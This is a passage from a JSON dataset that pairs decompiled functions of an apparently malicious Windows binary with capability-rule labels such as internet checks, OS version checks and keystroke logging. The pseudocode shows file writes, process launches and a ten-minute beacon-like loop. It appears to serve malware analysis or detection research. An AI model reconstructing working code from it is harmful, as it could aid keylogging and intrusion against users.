        "decompiled_code": "\nuint fcn.00405143(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*0x42d5fc == 0) {\n        *0x42d5fc = func_0x00409838(0x42df61, 0, 0, 0, 199, 0);\n        if (*0x42d5fc == 0) {\n            return 0;\n        }\n    }\n    else {\n        uVar1 = func_0x004095b0();\n        iVar2 = func_0x00409850(uVar1);\n        if (iVar2 == *0x42d5fc) {\n            return 1;\n        }\n    }\n    uVar1 = func_0x00409844(*0x42d5fc);\n    return uVar1;\n}\n",
        "token_count": 197
    },
    "004051d6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004051d6(int32_t arg_8h, int32_t arg_ch, uchar *arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = arg_ch;\n    while( true ) {\n        if (*(arg_8h + iVar1) == '\\0') {\n            if (((arg_ch == 0) || (*(arg_8h + iVar1) != '\\0')) || (*(arg_8h + iVar1 + -1) != '\\n')) {\n                iVar1 = func_0x00409754(arg_8h + arg_ch);\n                if (iVar1 == 0) {\n                    arg_ch = 0;\n                }\n                else {\n                    func_0x00409548(arg_10h, arg_8h + arg_ch);\n                    arg_ch = arg_ch + iVar1;\n                }\n            }\n            else {\n                *arg_10h = 0;\n                arg_ch = arg_ch + 1;\n            }\n            return arg_ch;\n        }\n        if (*(arg_8h + iVar1) == '\\r') break;\n        iVar1 = iVar1 + 1;\n    }\n    func_0x004099b8(arg_10h, arg_8h + arg_ch, iVar1 - arg_ch);\n    arg_10h[iVar1 - arg_ch] = 0;\n    return iVar1 + 2;\n}\n",
        "token_count": 316
    },
    "0040535c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl\nfcn.0040535c(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uchar *arg_18h, uint32_t arg_1ch, int32_t arg_20h\n            , uint arg_24h)\n\n{\n    char *pcVar1;\n    int32_t arg_8h_00;\n    int32_t iVar2;\n    uint32_t uStackY131148;\n    uint32_t uStackY131144;\n    uchar auStackY131110 [10];\n    uint uStackY131100;\n    uint32_t uStackY131096;\n    uchar *puStackY131092;\n    char acStackY131088 [65536];\n    int32_t iStackY65552;\n    uint32_t uStackY65548;\n    uchar *puStackY65544;\n    char acStackY65540 [65436];\n    uint uStackY104;\n    int32_t iStackY100;\n    uchar *puStackY96;\n    uint uStackY92;\n    uint uStackY88;\n    uchar *puStackY84;\n    uint uStackY80;\n    uchar *puStackY76;\n    uint uStackY72;\n    uchar *puStackY68;\n    int32_t iStackY64;\n    uchar *puStackY60;\n    uchar *puStackY56;\n    uchar *puStackY52;\n    \n    func_0x00409528();\n    iStackY65552 = 0;\n    uStackY131096 = 0;\n    arg_8h_00 = fcn.0040441a(arg_ch, &stack0xfffefff4);\n    if (arg_8h_00 == 0) {\n        uStackY131096 = 0;\n    }\n    else if (uStackY65548 == 0) {\n        func_0x004096a0();\n        uStackY131096 = 0;\n    }\n    else {\n        func_0x00409754();\n        puStackY65544 = func_0x00409694();\n        func_0x00409610();\n        iVar2 = -1;\n        do {\n            iVar2 = iVar2 + 1;\n        } while (*(arg_8h + iVar2) != '\\0');\n        fcn.004021ce(arg_8h + iVar2, 8);\n        func_0x00409a24();\n        func_0x00409a00();\n        iVar2 = func_0x004099e8();\n        if (iVar2 % 10 < 5) {\n            func_0x00409a24();\n        }\n        iVar2 = func_0x004099e8();\n        if (iVar2 % 10 < 5) {\n            func_0x004099e8();\n            puStackY52 = puStackY65544;\n            puStackY56 = 0x4054cd;\n            func_0x00409a00();\n        }\n        iVar2 = func_0x004099e8();\n        if (iVar2 % 10 < 5) {\n            func_0x00409a24();\n        }\n        func_0x00409a24();\n        iVar2 = func_0x004099e8();\n        if (iVar2 % 10 < 5) {\n            func_0x00409a24();\n        }\n        iVar2 = func_0x004099e8();\n        if (iVar2 % 10 < 5) {\n            func_0x004099e8();\n            puStackY52 = puStackY65544;\n            puStackY56 = 0x40557a;\n            func_0x00409a00();\n        }\n        puStackY52 = 0x42df21;\n        puStackY56 = puStackY65544;\n        puStackY60 = 0x405597;\n        func_0x00409a00();\n        iVar2 = func_0x004099e8();\n        if (iVar2 % 10 < 5) {\n            func_0x00409a24();\n        }\n        func_0x00409a24();\n        iVar2 = func_0x004099e8();\n        if (iVar2 % 10 < 5) {\n            func_0x00409a24();\n        }\n        func_0x00409a24();\n        iVar2 = func_0x004099e8();\n        if (iVar2 % 10 < 5) {\n            func_0x004099e8();\n            puStackY52 = puStackY65544;\n            puStackY56 = 0x405642;\n            func_0x00409a00();\n        }\n        func_0x004099e8();\n        puStackY52 = 0x40566a;\n        func_0x00409a00();\n        puStackY52 = &stack0xfffdffda;\n        puStackY56 = arg_10h;\n        puStackY60 = puStackY65544;\n        iStackY64 = 0x42ded0;\n        puStackY68 = puStackY65544;\n        uStackY72 = 0x405686;\n        func_0x00409a00();\n        iVar2 = func_0x004099e8();\n        if (iVar2 % 10 < 5) {\n            func_0x004099e8();\n            puStackY52 = puStackY65544;\n            puStackY56 = 0x4056bb;\n            func_0x00409a00();\n        }\n        iVar2 = func_0x004099e8();\n        if (iVar2 % 10 < 5) {\n            func_0x00409a24();\n        }\n        iVar2 = func_0x004099e8();\n        if (iVar2 % 10 < 5) {\n            func_0x00409a24();\n        }\n        iVar2 = func_0x004099e8();\n        if (iVar2 % 10 < 5) {\n            func_0x00409a24();\n        }\n        puStackY52 = 0x42de9a;\n        puStackY56 = puStackY65544;\n        puStackY60 = 0x40574d;\n        func_0x00409a00();\n        iVar2 = func_0x004099e8();\n        if (iVar2 % 10 < 5) {\n            func_0x00409a24();\n        }\n        iVar2 = func_0x004099e8();\n        if (iVar2 % 10 < 5) {\n            func_0x00409a24();\n        }\n        iVar2 = func_0x004099e8();\n        if (iVar2 % 10 < 5) {\n            func_0x004099e8();\n            puStackY52 = puStackY65544;\n            puStackY56 = 0x4057db;\n            func_0x00409a00();\n        }\n        if (arg_20h == 0) {\n            uStackY65548 = arg_1ch;\n            while( true ) {\n                puStackY52 = 0x405ad6;\n                uStackY65548 = fcn.004051d6(arg_8h_00, uStackY65548, &stack0xfffefffc);\n                if (uStackY65548 == 0) break;\n                if (acStackY65540[0] != '\\0') {\n                    if (arg_1ch + 0xc800 <= uStackY65548) break;\n                    puStackY52 = 0x4059b2;\n                    uStackY131096 = uStackY65548;\n                    func_0x00409a00();\n                    iVar2 = -1;\n                    do {\n                        pcVar1 = &stack0xfffdfff1 + iVar2;\n                        iVar2 = iVar2 + 1;\n                    } while (*pcVar1 != '\\0');\n                    func_0x00409548();\n                    puStackY52 = 0x4059fb;\n                    puStackY131092 = fcn.004052a4(&stack0xfffdfff0);\n                    puStackY52 = arg_18h;\n                    puStackY60 = puStackY65544;\n                    iStackY64 = 0x42de64;\n                    puStackY68 = puStackY65544;\n                    uStackY72 = 0x405a25;\n                    puStackY56 = puStackY131092;\n                    func_0x00409a00();\n                    iVar2 = func_0x004099e8();\n                    if (iVar2 % 10 < 5) {\n                        puStackY52 = puStackY65544;\n                        puStackY56 = 0x405a5f;\n                        func_0x00409a24();\n                    }\n                    iVar2 = func_0x004099e8();\n                    if (iVar2 % 10 < 5) {\n                        puStackY52 = puStackY65544;\n                        puStackY56 = 0x405a84;\n                        func_0x00409a24();\n                    }\n                    iVar2 = func_0x004099e8();\n                    if (iVar2 % 10 < 5) {\n                        puStackY52 = puStackY65544;\n                        puStackY56 = 0x405aa9;\n                        func_0x00409a24();\n                    }\n                    puStackY52 = 0x405ab7;\n                    func_0x004096a0();\n                    iStackY65552 = iStackY65552 + 1;\n                }\n            }\n        }\n        else {\n            for (uStackY131144 = 0; uStackY131144 < uStackY65548; uStackY131144 = uStackY131144 + 0x80) {\n                acStackY65540[0] = '\\0';\n                for (uStackY131148 = 0; (uStackY131148 < 0x80 && (uStackY131144 + uStackY131148 < uStackY65548));\n                    uStackY131148 = uStackY131148 + 1) {\n                    puStackY52 = 0x42df5a;\n                    puStackY56 = &stack0xfffefffc;\n                    puStackY60 = 0x405871;\n                    func_0x00409a00();\n                }\n                puStackY52 = puStackY65544;\n                puStackY56 = 0x42de64;\n                puStackY60 = puStackY65544;\n                iStackY64 = 0x4058b2;\n                func_0x00409a00();\n                iVar2 = func_0x004099e8();\n                if (iVar2 % 10 < 5) {\n                    func_0x00409a24();\n                }\n                iVar2 = func_0x004099e8();\n                if (iVar2 % 10 < 5) {\n                    func_0x00409a24();\n                }\n                iVar2 = func_0x004099e8();\n                if (iVar2 % 10 < 5) {\n                    func_0x00409a24();\n                }\n                iStackY65552 = iStackY65552 + 1;\n            }\n            uStackY131096 = uStackY65548;\n        }\n        func_0x00409a24();\n        iVar2 = func_0x004099e8();\n        if (iVar2 % 10 < 5) {\n            func_0x00409a24();\n        }\n        iVar2 = func_0x004099e8();\n        if (iVar2 % 10 < 5) {\n            func_0x00409a24();\n        }\n        iVar2 = func_0x004099e8();\n        if (iVar2 % 10 < 5) {\n            func_0x00409a24();\n        }\n        func_0x00409a24();\n        iVar2 = func_0x004099e8();\n        if (iVar2 % 10 < 5) {\n            func_0x004099e8();\n            puStackY52 = puStackY65544;\n            puStackY56 = 0x405bb4;\n            func_0x00409a00();\n        }\n        iVar2 = func_0x004099e8();\n        if (iVar2 % 10 < 5) {\n            func_0x00409a24();\n        }\n        iVar2 = func_0x004099e8();\n        if (iVar2 % 10 < 5) {\n            func_0x00409a24();\n        }\n        iVar2 = func_0x004099e8();\n        if (iVar2 % 10 < 5) {\n            func_0x00409a24();\n        }\n        iVar2 = func_0x004099e8();\n        if (iVar2 % 10 < 5) {\n            func_0x004099e8();\n            puStackY52 = puStackY65544;\n            puStackY56 = 0x405c5e;\n            func_0x00409a00();\n        }\n        func_0x00409a24();\n        iVar2 = func_0x004099e8();\n        if (iVar2 % 10 < 5) {\n            func_0x00409a24();\n        }\n        func_0x00409a24();\n        iVar2 = func_0x004099e8();\n        if (iVar2 % 10 < 5) {\n            func_0x00409a24();\n        }\n        func_0x00409a24();\n        iVar2 = func_0x004099e8();\n        if (iVar2 % 10 < 5) {\n            func_0x00409a24();\n        }\n        puStackY52 = puStackY65544;\n        puStackY56 = 0x405d34;\n        func_0x00409a00();\n        iVar2 = func_0x004099e8();\n        if (iVar2 % 10 < 5) {\n            func_0x00409a24();\n        }\n        func_0x00409a24();\n        iVar2 = func_0x004099e8();\n        if (iVar2 % 10 < 5) {\n            func_0x00409a24();\n        }\n        func_0x004099e8();\n        puStackY52 = puStackY65544;\n        puStackY56 = 0x405dc2;\n        func_0x00409a00();\n        iVar2 = func_0x004099e8();\n        if (iVar2 % 10 < 5) {\n            func_0x00409a24();\n        }\n        func_0x00409a24();\n        iVar2 = func_0x004099e8();\n        if (iVar2 % 10 < 5) {\n            func_0x00409a24();\n        }\n        iVar2 = func_0x004099e8();\n        if (iVar2 % 10 < 5) {\n            func_0x004099e8();\n            puStackY52 = puStackY65544;\n            puStackY56 = 0x405e5a;\n            func_0x00409a00();\n        }\n        func_0x00409a24();\n        puStackY52 = NULL;\n        puStackY56 = NULL;\n        puStackY60 = 0x40000000;\n        iStackY64 = arg_8h;\n        puStackY68 = 0x405e87;\n        uStackY131100 = func_0x004096b8();\n        puStackY68 = puStackY65544;\n        uStackY72 = 0x405e9e;\n        uStackY80 = func_0x00409754();\n        uStackY72 = 0;\n        puStackY76 = &stack0xfffefff0;\n        puStackY84 = puStackY65544;\n        uStackY88 = uStackY131100;\n        uStackY92 = 0x405eb9;\n        func_0x00409748();\n        uStackY92 = uStackY131100;\n        puStackY96 = 0x405ec4;\n        func_0x004095ec();\n        puStackY96 = puStackY65544;\n        iStackY100 = 0x405ecf;\n        func_0x004096a0();\n        uStackY104 = 0x405ee1;\n        iStackY100 = arg_8h_00;\n        func_0x004096a0();\n    }\n    return uStackY131096;\n}\n",
        "token_count": 3648
    },
    "00405f84": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00405f84(char *arg_8h)\n\n{\n    char cVar1;\n    uint arg_1ch;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint arg_24h;\n    uint uVar7;\n    int32_t iVar8;\n    char *arg_10h;\n    int32_t iVar9;\n    char *arg_ch;\n    uint var_29ch;\n    uint8_t var_295h;\n    uint var_294h;\n    uint var_290h;\n    uint var_28ch;\n    uint var_288h;\n    uint var_280h;\n    uint var_27ch;\n    uint var_278h;\n    uint var_274h;\n    uint var_270h;\n    uint var_26ch;\n    uint var_268h;\n    int32_t var_264h;\n    uint var_260h;\n    uint var_25ch;\n    uint var_258h;\n    uint var_24ch;\n    uint var_148h;\n    uint var_11ch;\n    uint var_118h;\n    uint var_104h;\n    \n    cVar1 = *arg_8h;\n    arg_1ch = *(arg_8h + 1);\n    iVar9 = 0;\n    arg_ch = arg_8h + 5;\n    iVar2 = func_0x00409754(arg_ch);\n    arg_10h = arg_8h + iVar2 + 6;\n    iVar2 = func_0x00409754(arg_ch);\n    iVar3 = func_0x00409754(arg_10h);\n    iVar4 = func_0x00409754(arg_ch);\n    iVar5 = func_0x00409754(arg_10h);\n    iVar6 = func_0x00409754(arg_8h + iVar3 + iVar2 + 7);\n    arg_24h = func_0x00409664(0x42d600);\n    func_0x004099c4(&var_25ch, 0, 0x10);\n    uVar7 = func_0x0040961c();\n    func_0x00409a0c(uVar7);\n    iVar8 = fcn.004050b9(0x80000002, 0x42dcb4, 0x42dcaf, &var_24ch, 0x104);\n    if (iVar8 == 0) {\n        func_0x004096a0(arg_ch);\n        var_264h = 0;\n    }\n    else {\n        fcn.00405eec();\n        func_0x00409580(&var_24ch, &var_104h, 0x104);\n        var_264h = fcn.0040535c(&var_24ch, arg_ch, arg_10h, arg_8h + iVar3 + iVar2 + 7, \n                                arg_8h + iVar6 + iVar5 + iVar4 + 8, arg_1ch, cVar1 == '\\x01', arg_24h);\n        if (var_264h == 0) {\n            func_0x004096a0(arg_ch);\n            var_264h = 0;\n        }\n        else {\n            func_0x00409a24(&var_104h, 0x42dca0);\n            func_0x00409a24(&var_104h, &var_24ch);\n            iVar2 = fcn.00405143();\n            func_0x004099c4(&var_148h, 0, 0x44);\n            var_148h = 0x44;\n            var_11ch = 1;\n            var_118h._0_2_ = 0;\n            if (iVar2 != 0) {\n                var_118h._0_2_ = 1;\n                fcn.004051bd(&var_148h);\n            }\n            iVar2 = func_0x00409718(0, &var_104h, 0, 0, 0, 0x20, 0, 0, &var_148h, &var_25ch);\n            if (iVar2 == 0) {\n                var_264h = 0;\n            }\n            else {\n                func_0x004095ec(var_258h);\n                func_0x00409a00(&var_104h, 0x42dc7d, 0x42df12, arg_24h);\n                for (var_295h = 0; var_295h < 5; var_295h = var_295h + 1) {\n                    iVar9 = func_0x0040979c(0x42dc75, &var_104h);\n                    if (iVar9 != 0) break;\n                    func_0x004096f4(1000);\n                }\n                if (iVar9 == 0) {\n                    var_264h = 0;\n                }\n                else {\n                    func_0x004096f4(0x7800);\n                    if ((cVar1 == '\\x01') != 0) {\n                        func_0x004096f4(0xf000);\n                    }\n                    func_0x00409784(iVar9, &var_104h, 0x104);\n                    iVar2 = fcn.0040203b(&var_104h, 0x42dc6a, 1);\n                    if (iVar2 == 0xffff) {\n                        var_264h = 0;\n                    }\n                }\n            }\n            func_0x00409778(&var_24ch);\n            func_0x004096a0(arg_ch);\n            func_0x00409700(var_25ch, 0);\n            func_0x004095ec(var_25ch);\n        }\n    }\n    return var_264h;\n}\n",
        "token_count": 1314
    },
    "00406346": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00406346(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, int32_t arg_1ch)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_14h;\n    uint var_10h;\n    uint var_ah;\n    uint16_t var_4h;\n    uint var_2h;\n    \n    var_2h._0_2_ = func_0x00409754(arg_8h);\n    var_4h = func_0x00409754(arg_ch);\n    var_ah._0_2_ = func_0x00409754(arg_10h);\n    uVar1 = func_0x00409754(arg_14h);\n    iVar2 = func_0x00409694(0, var_2h + var_4h + var_ah + 0x28 + uVar1);\n    *iVar2 = arg_1ch == 1;\n    func_0x004099b8(iVar2 + 1, &arg_18h, 4);\n    func_0x00409548(iVar2 + 5, arg_8h);\n    func_0x00409548(iVar2 + var_2h + 6, arg_ch);\n    func_0x00409548(iVar2 + var_2h + 7 + var_4h, arg_10h);\n    func_0x00409548(iVar2 + var_2h + var_4h + 8 + var_ah, arg_14h);\n    uVar3 = func_0x0040976c(0, 0, 0x405384, iVar2, 0, &var_ah + 2);\n    func_0x00409724(uVar3, 0xffffffff);\n    func_0x004095bc(uVar3, &var_ah + 2);\n    func_0x004095ec(uVar3);\n    return stack0xfffffff4;\n}\n",
        "token_count": 487
    },
    "0040656f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040656f(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uchar auStackY8204 [4];\n    uint uStackY8200;\n    uchar auStackY8196 [8112];\n    uint uStackY84;\n    uint uStackY80;\n    uint uStackY76;\n    uchar *puStackY72;\n    uint uStackY68;\n    uchar *puStackY64;\n    uint uStackY60;\n    uchar *puStackY56;\n    int32_t iStackY52;\n    uint uStackY48;\n    uchar *puStackY44;\n    uchar *puStackY40;\n    uchar *puStackY36;\n    \n    func_0x00409528();\n    func_0x00409610();\n    iVar1 = -1;\n    do {\n        iVar1 = iVar1 + 1;\n    } while (*(arg_8h + iVar1) != '\\0');\n    puStackY36 = 0x4065bf;\n    fcn.004021ce(arg_8h + iVar1, 8);\n    puStackY36 = 0x4065cd;\n    func_0x00409a24();\n    puStackY36 = 0x4065fc;\n    func_0x00409a00();\n    iVar1 = func_0x004099e8();\n    if (iVar1 % 10 < 5) {\n        puStackY36 = 0x406622;\n        func_0x00409a24();\n    }\n    iVar1 = func_0x004099e8();\n    if (iVar1 % 10 < 5) {\n        func_0x004099e8();\n        puStackY36 = 0x42dc58;\n        puStackY40 = &stack0xffffdffc;\n        puStackY44 = 0x406663;\n        func_0x00409a00();\n    }\n    iVar1 = func_0x004099e8();\n    if (iVar1 % 10 < 5) {\n        puStackY36 = 0x406689;\n        func_0x00409a24();\n    }\n    puStackY36 = 0x40669d;\n    func_0x00409a24();\n    iVar1 = func_0x004099e8();\n    if (iVar1 % 10 < 5) {\n        puStackY36 = 0x4066cf;\n        func_0x00409a24();\n    }\n    iVar1 = func_0x004099e8();\n    if (iVar1 % 10 < 5) {\n        func_0x004099e8();\n        puStackY36 = 0x42dc58;\n        puStackY40 = &stack0xffffdffc;\n        puStackY44 = 0x40670a;\n        func_0x00409a00();\n    }\n    puStackY36 = &stack0xffffdffc;\n    puStackY40 = 0x42df21;\n    puStackY44 = &stack0xffffdffc;\n    uStackY48 = 0x40672d;\n    func_0x00409a00();\n    iVar1 = func_0x004099e8();\n    if (iVar1 % 10 < 5) {\n        puStackY36 = 0x406753;\n        func_0x00409a24();\n    }\n    puStackY36 = 0x406767;\n    func_0x00409a24();\n    iVar1 = func_0x004099e8();\n    if (iVar1 % 10 < 5) {\n        puStackY36 = 0x406793;\n        func_0x00409a24();\n    }\n    puStackY36 = 0x4067a7;\n    func_0x00409a24();\n    iVar1 = func_0x004099e8();\n    if (iVar1 % 10 < 5) {\n        func_0x004099e8();\n        puStackY36 = 0x42dc58;\n        puStackY40 = &stack0xffffdffc;\n        puStackY44 = 0x4067e2;\n        func_0x00409a00();\n    }\n    puStackY36 = 0x4067f6;\n    func_0x00409a24();\n    iVar1 = func_0x004099e8();\n    if (iVar1 % 10 < 5) {\n        puStackY36 = 0x40681c;\n        func_0x00409a24();\n    }\n    puStackY36 = 0x406836;\n    func_0x00409a24();\n    iVar1 = func_0x004099e8();\n    if (iVar1 % 10 < 5) {\n        puStackY36 = 0x40685c;\n        func_0x00409a24();\n    }\n    puStackY36 = 0x406870;\n    func_0x00409a24();\n    iVar1 = func_0x004099e8();\n    if (iVar1 % 10 < 5) {\n        puStackY36 = 0x406896;\n        func_0x00409a24();\n    }\n    puStackY36 = 0x42dc2e;\n    puStackY40 = &stack0xffffdffc;\n    puStackY44 = 0x4068ba;\n    func_0x00409a00();\n    iVar1 = func_0x004099e8();\n    if (iVar1 % 10 < 5) {\n        puStackY36 = 0x4068e0;\n        func_0x00409a24();\n    }\n    puStackY36 = 0x4068f4;\n    func_0x00409a24();\n    iVar1 = func_0x004099e8();\n    if (iVar1 % 10 < 5) {\n        puStackY36 = 0x406929;\n        func_0x00409a24();\n    }\n    func_0x004099e8();\n    puStackY36 = 0x42dc16;\n    puStackY40 = &stack0xffffdffc;\n    puStackY44 = 0x40695a;\n    func_0x00409a00();\n    iVar1 = func_0x004099e8();\n    if (iVar1 % 10 < 5) {\n        puStackY36 = 0x406980;\n        func_0x00409a24();\n    }\n    puStackY36 = 0x406994;\n    func_0x00409a24();\n    iVar1 = func_0x004099e8();\n    if (iVar1 % 10 < 5) {\n        puStackY36 = 0x4069c0;\n        func_0x00409a24();\n    }\n    iVar1 = func_0x004099e8();\n    if (iVar1 % 10 < 5) {\n        func_0x004099e8();\n        puStackY36 = 0x42dc58;\n        puStackY40 = &stack0xffffdffc;\n        puStackY44 = 0x4069fb;\n        func_0x00409a00();\n    }\n    puStackY36 = 0x406a0f;\n    func_0x00409a24();\n    puStackY36 = 0x2;\n    puStackY40 = NULL;\n    puStackY44 = NULL;\n    uStackY48 = 0x40000000;\n    iStackY52 = arg_8h;\n    puStackY56 = 0x406a27;\n    uStackY8200 = func_0x004096b8();\n    puStackY56 = &stack0xffffdffc;\n    uStackY60 = 0x406a3f;\n    uStackY68 = func_0x00409754();\n    uStackY60 = 0;\n    puStackY64 = &stack0xffffdff4;\n    puStackY72 = &stack0xffffdffc;\n    uStackY76 = uStackY8200;\n    uStackY80 = 0x406a5b;\n    func_0x00409748();\n    uStackY80 = uStackY8200;\n    uStackY84 = 0x406a66;\n    func_0x004095ec();\n    return 1;\n}\n",
        "token_count": 1861
    },
    "00406a7c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00406a7c(int32_t arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_48ch;\n    uint var_488h;\n    uint8_t var_481h;\n    uint var_480h;\n    uint var_47ch;\n    uint var_474h;\n    uint var_370h;\n    int32_t var_26ch;\n    int32_t var_268h;\n    int32_t var_264h;\n    uint var_260h;\n    uint var_25ch;\n    uint var_258h;\n    uint var_24ch;\n    uint var_148h;\n    uint var_11ch;\n    uint var_118h;\n    uint var_104h;\n    \n    var_264h = 0;\n    iVar3 = 0;\n    var_26ch = func_0x00409754(arg_8h);\n    var_26ch = arg_8h + 1 + var_26ch;\n    uVar1 = func_0x0040961c();\n    func_0x00409a0c(uVar1);\n    fcn.00405eec();\n    var_260h = func_0x00409664(0x42d600);\n    func_0x004099c4(&var_25ch, 0, 0x10);\n    iVar2 = fcn.004050b9(0x80000002, 0x42dcb4, 0x42dcaf, &var_24ch, 0x104);\n    if (iVar2 != 0) {\n        func_0x00409580(&var_24ch, &var_104h, 0x104);\n        iVar2 = fcn.0040656f(&var_24ch, arg_8h, var_260h);\n        if (iVar2 != 0) {\n            func_0x00409a24(&var_104h, 0x42dca0);\n            func_0x00409a24(&var_104h, &var_24ch);\n            var_268h = fcn.00405143();\n            func_0x004099c4(&var_148h, 0, 0x44);\n            var_148h = 0x44;\n            var_11ch = 1;\n            if (var_268h != 0) {\n                var_118h._0_2_ = 1;\n                fcn.004051bd(&var_148h);\n            }\n            iVar2 = func_0x00409718(0, &var_104h, 0, 0, 0, 0x20, 0, 0, &var_148h, &var_25ch);\n            if (iVar2 != 0) {\n                func_0x004095ec(var_258h);\n                func_0x00409a00(&var_104h, 0x42dc7d, 0x42df12, var_260h);\n                for (var_481h = 0; var_481h < 5; var_481h = var_481h + 1) {\n                    iVar3 = func_0x0040979c(0x42dc75, &var_104h);\n                    if (iVar3 != 0) break;\n                    func_0x004096f4(1000);\n                }\n                if (iVar3 != 0) {\n                    func_0x004096f4(0xf000);\n                    func_0x00409784(iVar3, &var_370h, 0x104);\n                    iVar2 = fcn.0040203b(&var_370h, 0x42dc6a, 1);\n                    if (iVar2 != 0xffff) {\n                        iVar2 = fcn.00406481(arg_8h, &var_474h);\n                        if (iVar2 != 0) {\n                            func_0x00409658(&var_474h, var_26ch, 0);\n                            iVar2 = fcn.0040441a(var_26ch, &var_264h);\n                            func_0x00409778(var_26ch);\n                            uVar1 = func_0x00409754(0x42dc0b);\n                            iVar3 = func_0x00409a3c(iVar2, 0x42dc0b, uVar1);\n                            if (iVar3 == 0) {\n                                iVar3 = func_0x00409754(0x42dc0b);\n                                fcn.00404566(var_26ch, iVar3 + iVar2, var_264h + -0x3a);\n                            }\n                            else {\n                                fcn.00404566(var_26ch, iVar2, var_264h + -0x33);\n                            }\n                            func_0x004096a0(iVar2);\n                            var_264h = 1;\n                        }\n                    }\n                }\n            }\n            func_0x00409778(&var_24ch);\n            func_0x00409700(var_25ch, 0);\n            func_0x004095ec(var_25ch);\n            iVar2 = var_264h;\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 1176
    },
    "00407cce": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00407cce(void)\n\n{\n    int32_t iVar1;\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    uint var_1h;\n    \n    do {\n        func_0x00409548(&var_100h, 0x42b0a2);\n        iVar1 = func_0x004099e8();\n        var_1h._0_1_ = iVar1 % 0xf;\n        if (var_1h == '\\x01') {\n            func_0x00409548(&var_100h, 0x42b0bd);\n        }\n        if (var_1h == '\\x02') {\n            func_0x00409548(&var_100h, 0x42b0d8);\n        }\n        if (var_1h == '\\x03') {\n            func_0x00409548(&var_100h, 0x42b0f5);\n        }\n        if (var_1h == '\\x04') {\n            func_0x00409548(&var_100h, 0x42b114);\n        }\n        if (var_1h == '\\x05') {\n            func_0x00409548(&var_100h, 0x42b130);\n        }\n        if (var_1h == '\\x06') {\n            func_0x00409548(&var_100h, 0x42b14b);\n        }\n        if (var_1h == '\\a') {\n            func_0x00409548(&var_100h, 0x42b164);\n        }\n        if (var_1h == '\\b') {\n            func_0x00409548(&var_100h, 0x42b183);\n        }\n        if (var_1h == '\\t') {\n            func_0x00409548(&var_100h, 0x42b1a2);\n        }\n        if (var_1h == '\\n') {\n            func_0x00409548(&var_100h, 0x42b1df);\n        }\n        if (var_1h == '\\v') {\n            func_0x00409548(&var_100h, 0x42b201);\n        }\n        if (var_1h == '\\f') {\n            func_0x00409548(&var_100h, 0x42b221);\n        }\n        if (var_1h == '\\r') {\n            func_0x00409548(&var_100h, 0x42b239);\n        }\n        if (var_1h == '\\x0e') {\n            func_0x00409548(&var_100h, 0x42b255);\n        }\n        fcn.00406346(0x419e00, &var_100h, 0x42d94b, 0x42d942, 0, 0);\n        fcn.00407bfc(0x419f40, 0x42b1be, 0x42d93b);\n        func_0x00409988(600000);\n    } while( true );\n}\n",
        "token_count": 728
    },
    "00407efb": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
